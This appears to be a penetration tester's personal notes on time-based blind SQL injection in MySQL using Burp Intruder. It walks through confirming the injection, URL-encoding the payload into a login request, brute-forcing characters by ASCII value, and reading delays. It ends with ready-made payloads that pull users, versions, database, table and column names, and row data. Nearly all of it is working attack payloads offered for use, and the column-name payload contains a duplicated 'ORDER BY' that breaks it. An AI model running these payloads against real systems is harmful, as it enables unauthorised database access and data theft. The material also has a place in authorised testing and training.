
**USE BURP SUITE FOR SENDING SQL INJECTION PAYLOADS - THIS WILL MAKE LIFE A LOT EASIER**

----
### **Assumption:** You must confirm time based injection is possible using the following SQL injection payload:

`' OR IF(1=1,SLEEP(5),0)-- -`

If the response is delayed by 5 seconds, injection has been confirmed and you can proceed with time-based extraction.

---

## 🎯 Goal

Automate character-by-character data extraction from the database using time-based SQL injection, e.g.:

`' OR IF(ASCII(SUBSTRING(DATABASE(),1,1))=97,SLEEP(5),0)-- -`

You’ll brute-force the ASCII values for each character position using Burp Intruder.

---

## ✅ Step-by-Step Guide to Use Burp Intruder for Time-Based SQLi

---

### 🔧 1. Capture and Send Request to Intruder

1. **Enable Intercept** in Burp Proxy.
    
2. Submit the **login form** (or any request with the injection point).
    
3. In Burp, right-click the request → **"Send to Intruder"**.
    
4. Go to the **Intruder** tab.
    

---

### 🎯 2. Set Up Positions

1. Go to the **"Positions"** tab in Intruder.
    
2. Click **"Clear §"** to remove auto-selected positions.
    
3. Next, replace the vulnerable parameter with the time based injection, for example:
    

#### Example:

If this was your original request structure:

`GET /ai/includes/user_login?email=abc&password=123 HTTP/1.1`

... and you had confirmed time based SQL injection was possible in the email field, you would change the request to:

`GET /ai/includes/user_login?email=%27%20OR%20IF%28ASCII%28SUBSTRING%28DATABASE%28%29%2C1%2C1%29%29%3DPAYLOAD%2CSLEEP%285%29%2C0%29--%20-&password=123`

The actual payload here is:

`GET /ai/includes/user_login?email=' OR IF(ASCII(SUBSTRING(DATABASE(),1,1))=PAYLOAD,SLEEP(5),0)-- -&password=123`

**However, you must make sure you URL encode your payload prior to inserting it into the request string.** You can use URL Encoder (https://www.urlencoder.io/) , which is also linked here: [[Useful Websites (Misc)]] You can also use CyberChef (https://gchq.github.io/CyberChef/), which is also linked here: [[Useful Websites (Misc)]]. **NB: CyberChef uses stricter encoding than `urlencoder`. Try the `urlencoder` first, as it will not encode chars such as `--`, if it is blocked or not working, possibly by WAF/Filtering, then try the stricter encoding, as provided by CyberChef.**

**IN OTHER WORDS: replace `abc` with URL encoded version of `' OR IF(ASCII(SUBSTRING(DATABASE(),1,1))=PAYLOAD,SLEEP(5),0)-- -`**

(.. or whichever payload you want to use from the example payloads below)

#### Finally:

**You must then highlight the string `PAYLOAD` (you can see the string `PAYLOAD` within the payload itself) and click the `Add §` button.**

---

### ⚙️ 3. Configure Payloads (ASCII brute-force)

1. Go to the **"Payloads"** tab.
    
2. Set the "Payload type" to `Numbers`

3. Configure:
    
    - **From**: 32 (space)
        
    - **To**: 126 (tilde)
        
    - **Step**: 1

---

### ⏱️ 4. Analyze Responses by Time
    
1. In **"Intruder" > "Start attack"**, in the results table:
    
    - Look at the **"Response received"** column (the time taken to begin receiving a response (in milliseconds)).
    - A delay (e.g., ~5 seconds, **5000 in milliseconds**) indicates a **correct guess**.

**NB: Do not just accept that the first response that takes longer than 5000 milliseconds is the correct extraction. Let the entire attack run and look for the LONGEST response. Sometimes a response may delay due to network latency etc. **

**OR SIMPLY, RERUN THE ATTACK UNTIL YOU GET A SINGLE RESPONSE/ANSWER**

**DO NOT RUN NUMEROUS INTRUDER ATTACKS IN PARALLEL WHEN DOING A TIME BASED ATTACK, AS THE NETWORK LATENCY CAUSED BY MULTIPLE PARALLEL REQUESTS CAN CAUSE FALSE POSITIVES**

---

### 🔁 5. Repeat for Next Character

Once you get a match for position 1 (e.g., ASCII 100 = `'d'`), repeat:

1. Go back to **"Positions"**
    
2. Change this part:
    

`SUBSTRING(DATABASE(),1,1)`

to

`SUBSTRING(DATABASE(),2,1)`

3. Start a new attack and repeat the process, until there is no longer any delays, at which point you will have the fully extracted string.

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**


---

## 🧠 1. Example Payload - Extract Current User

`' OR IF(ASCII(SUBSTRING(USER(),N,1))=PAYLOAD,SLEEP(5),0)-- -`

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

---

## 🧠 2. Example Payload - Extract Database Version

`' OR IF(ASCII(SUBSTRING(VERSION(),N,1))=PAYLOAD,SLEEP(5),0)-- -`

OR

`' OR IF(ASCII(SUBSTRING(@@version,N,1))=PAYLOAD,SLEEP(5),0)-- -`

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

----

## 🧠 3. Example Payload - Extract Current Database Name

`' OR IF(ASCII(SUBSTRING(DATABASE(),N,1))=PAYLOAD,SLEEP(5),0)-- -`

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

## 🧠 3.1. Example Payload - Extract All Database Names from DBMS

`' OR IF(ASCII(SUBSTRING((SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT N,1),X,1))=PAYLOAD,SLEEP(5),0)-- -`

1. `N` will need to be replaced with `0` for the first database in the DBMS, `1` for the second, etc.
2. `X` denotes the character position of the database name. For example, `1` for the first character of the database name, `2` for the second character of the database name.

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

----

## 🧠 4. Example Payload - Extract Table Names from a Database

`' OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='DATABASE_NAME' ORDER BY table_name LIMIT N,1),X,1))=PAYLOAD,SLEEP(5),0)-- -`

1. You will need to replace the variable `DATABASE_NAME` with the name of a database (see `3. Example Payload - Extract Current Database Name`).
2. `N` will need to be replaced with `0` for the first table in the database, `1` for the second, etc.
3. `X` denotes the character position of the table name. For example, `1` for the first character of the table name, `2` for the second character of the table name.

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

----

## 🧠 5. Example Payload - Extract Column Names from a Table

`' OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='TABLE_NAME' AND table_schema='DATABASE_NAME' ORDER BY ORDER BY ordinal_position LIMIT N,1),X,1))=PAYLOAD,SLEEP(5),0)-- -`

1. You will need to replace the variable `TABLE_NAME` with the name of a table (see `4. Example Payload - Extract Table Names from a Database`).
2. You will need to replace the variable `DATABASE_NAME` with the name of a database (see `3. Example Payload - Extract Current Database Name`).
3. `N` will need to be replaced with `0` for the first column in the table, `1` for the second, etc.
4. `X` denotes the character position of the column name. For example, `1` for the first character of the column name, `2` for the second character of the column name.

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**

----

## 🧠 6. Example Payload - Extract Cell Value/Data

`' OR IF(ASCII(SUBSTRING((SELECT COLUMN_NAME FROM DATABASE_NAME.TABLE_NAME LIMIT N,1),X,1))=PAYLOAD,SLEEP(5),0)-- -`

1. You will need to replace the variable `COLUMN_NAME` with the name of a column (see `5. Example Payload - Extract Column Names from a Table`).
2. You will need to replace the variable `DATABASE_NAME` with the name of a database (see `3. Example Payload - Extract Current Database Name`).
3. You will need to replace the variable `TABLE_NAME` with the name of a table (see `4. Example Payload - Extract Table Names from a Database`)
4. `N` will need to be replaced with `0` for the first row in the table, `1` for the second, etc.
5. `X` denotes the character position of the cell value. For example, `1` for the first character of the cell value, `2` for the second character of the cell value.

**DO NOT FORGET THE PAYLOAD MUST BE URL ENCODED AND THE ACTUAL STRING `PAYLOAD`, INSIDE THE PAYLOAD ITSELF, MUST BE DELIMITED BY THE `§` CHARACTER**





